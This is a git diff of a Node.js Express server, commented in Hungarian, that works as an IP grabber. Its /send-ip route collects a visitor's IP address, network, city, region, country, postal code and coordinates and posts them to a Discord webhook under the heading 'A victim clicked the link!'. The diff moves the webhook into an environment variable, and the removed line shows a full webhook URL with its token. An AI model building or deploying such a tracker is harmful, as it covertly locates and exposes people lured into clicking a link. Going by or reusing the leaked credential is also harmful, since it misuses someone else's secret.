@@ -1,14 +1,15 @@
 const express = require('express');
 const axios = require('axios');
 const path = require('path');
+require('dotenv').config(); // Betöltjük a .env fájlt
 const app = express();
 const port = process.env.PORT || 3000;
 
+// Discord Webhook URL betöltése a .env fájlból
+const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+
 // Statikus fájlok kiszolgálása (pl. style.css)
 app.use(express.static(path.join(__dirname, 'public'))); // Ha a CSS a 'public' mappában van
-
-// Fixált Discord Webhook URL
-const webhookUrl = 'https://discord.com/api/webhooks/1163410175395373107/Tc5X6Ndt2R6qwVVbh5kVYgBSByLdEAC_mOQa9C7VbMjXxkgLUukRQVOFumbDRs5d1A9u';
 
 // IP cím és hely információ küldése a Discordra
 app.get('/send-ip', (req, res) => {
@@ -34,13 +35,13 @@ app.get('/send-ip', (req, res) => {
                 embeds: [
                     {
                         title: 'Egy áldozat rákattintott a linkre!',
-                        description: `**IP-cím >> **${userIp}\n**Hálózat >> ** ${network}\n**Város >> ** ${city}\n**Régió >> ** ${region}\n**Ország >> ** ${country}\n**Irányítószám >> ** ${postal}\n**Szélesség >> ** ${latitude}\n**Hosszúság >> ** ${longitude}`,
+                        description: `**IP-cím >>** ${userIp}\n**Hálózat >>** ${network}\n**Város >>** ${city}\n**Régió >>** ${region}\n**Ország >>** ${country}\n**Irányítószám >>** ${postal}\n**Szélesség >>** ${latitude}\n**Hosszúság >>** ${longitude}`,
                         color: 0x800080
                     }
                 ]
             };
 
-            // Küldés Discordra
+            // Küldés a Discordra
             axios.post(webhookUrl, message)
                 .then(response => {
                     res.send('IP-cím és helyadatok sikeresen elküldve Discordra!');
@@ -56,7 +57,7 @@ app.get('/send-ip', (req, res) => {
 
 // A gyökér útvonal beállítása
 app.get('/', (req, res) => {
-    res.sendFile(__dirname + '/index.html'); // Az index.html fájl kiszolgálása
+    res.sendFile(__dirname + '/public/home.html'); // Az index.html fájl kiszolgálása
 });
 
 // Szerver indítása
